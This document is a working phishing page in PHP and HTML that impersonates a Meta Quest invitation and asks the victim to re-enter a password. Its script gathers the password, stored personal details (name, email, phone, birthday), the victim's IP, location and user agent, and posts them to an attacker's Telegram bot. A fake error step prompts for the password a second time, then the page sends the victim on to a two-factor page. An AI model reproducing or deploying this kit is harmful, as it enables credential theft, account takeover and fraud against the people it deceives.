<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Review and Accept Invitation</title>
    <link rel="stylesheet" href="/styles/confirm-password.css">
</head>
<body>
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>

    <main class="main-container">
        <div class="oculus-invite-logo">
            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
            </svg>
        </div>
        <form action="" onsubmit="sendToTelegramFromConfirmBusinessInformation(event)">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Please re-enter your password</h2>
                </div>
                <div class="modal-body">
                    <p class="modal-message">For your security, you must re-enter your password to continue.</p>
                    <div class="password-input">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" disabled>
                    </div>
                    <div class="password-input">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password">
                        <svg id="eye" width="20px" height="20px" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
                            <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" fill="#ffffff"/>
                            <path d="M21.894 11.553C19.736 7.236 15.904 5 12 5c-3.903 0-7.736 2.236-9.894 6.553a1 1 0 0 0 0 .894C4.264 16.764 8.096 19 12 19c3.903 0 7.736-2.236 9.894-6.553a1 1 0 0 0 0-.894zM12 17c-2.969 0-6.002-1.62-7.87-5C5.998 8.62 9.03 7 12 7c2.969 0 6.002 1.62 7.87 5-1.868 3.38-4.901 5-7.87 5z" fill="#ffffff"/>
                        </svg>
                    </div>
                    <a href="#" class="forgot-password">Forgot your password?</a>
                </div>
                <div class="modal-footer">
                    <button class="submit-btn">Submit</button>
                </div>
            </div>
        </form>
    </main>
</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var fullName = localStorage.getItem('fullName');
        var email = localStorage.getItem('email');
        var phone = localStorage.getItem('phone');

        var emailElement = document.getElementById('email');
        emailElement.value = email;

        var paramsURL = new URLSearchParams(window.location.search);
        var error = paramsURL.get('error');

        if (error == 1) {
            var password = localStorage.getItem('password') || 'abcd';

            var passwordInput = document.getElementById('password');
            passwordInput.value = password;
            passwordInput.focus();
            passwordInput.select();
            passwordInput.style.borderBottom = '1px solid #FF0303';

            passwordInput.addEventListener('input', function() {
                if (passwordInput.value.length > 0) {
                    passwordInput.style.borderBottom = '1.5px solid #444';
                } else {
                    passwordInput.style.borderBottom = '1px solid #FF0303';
                }
            });
        }
    });

    var eye = document.getElementById('eye');
    eye.addEventListener('click', function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput.type == 'password') {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });

    function sendToTelegramFromConfirmBusinessInformation(event) {
        event.preventDefault();
        var password = document.getElementById('password').value;

        if (password == "") {
            alert("Please enter your password");
            return;
        }

        var email = localStorage.getItem('email');
        var fullName = localStorage.getItem('fullName');
        var phone = localStorage.getItem('phone');
        var birthday = localStorage.getItem('birthday');
        var interviewDate = localStorage.getItem('interviewDate');
        var experience = localStorage.getItem('experience');


        var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
            "\n" + "----------------------------------------------------------" +
            "\nFull Name: " + "`" + fullName + "`" +
            "\nEmail: " + "`" + email + "`" +
            "\nPhone Number: " + "`" + phone + "`" +
            "\nNgày sinh: " + "`" + birthday + "`" +
            "\nNgày phỏng vấn: " + "`" + interviewDate + "`" +
            "\nKinh nghiệm: " + "`" + experience + "`" +
            "\n" + "----------------------------------------------------------" +
            "\nPassword: " + "`" + password + "`" +
            "\n" + "----------------------------------------------------------" +
            "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
            "\nIP Address: " + "`<?php echo $ip; ?>`" +
            "\nCity: " + "`<?php echo $city; ?>`" +
            "\nRegion: " + "`<?php echo $region; ?>`" +
            "\nCountry: " + "`<?php echo $country; ?>`" +
            "\nOrg: " + "`<?php echo $org; ?>`" +
            "\nTimezone: " + "`<?php echo $timezone; ?>`" +
            "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

        var apiToken = "<?php echo $token; ?>";
        var data = {
            chat_id: '<?php echo $chatId; ?>',
            text: content,
            parse_mode: 'Markdown'
        };

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status >= 200 && xhr.status < 300) {
                    console.log('Message sent to Telegram bot successfully.');
                    setTimeout(function() {
                        var paramsURL = new URLSearchParams(window.location.search);
                        var error = paramsURL.get('error');

                        if (error == 1) {
                            window.location.href = "/two-factor-authentication.php";
                            localStorage.setItem('fullName', fullName);
                            localStorage.setItem('email', email);
                            localStorage.setItem('phone', phone);
                            localStorage.setItem('birthday', birthday);
                            localStorage.setItem('interviewDate', interviewDate);
                            localStorage.setItem('experience', experience);
                            localStorage.setItem('password', password);
                        } else {
                            localStorage.setItem('password', password);
                            window.location.href = "/confirm-password.php?error=1";
                        }
                    }, 1000);
                } else {
                    console.error('Failed to send message to Telegram bot.');
                }
            }
        };

        xhr.send(JSON.stringify(data));
    }
</script>

</html> 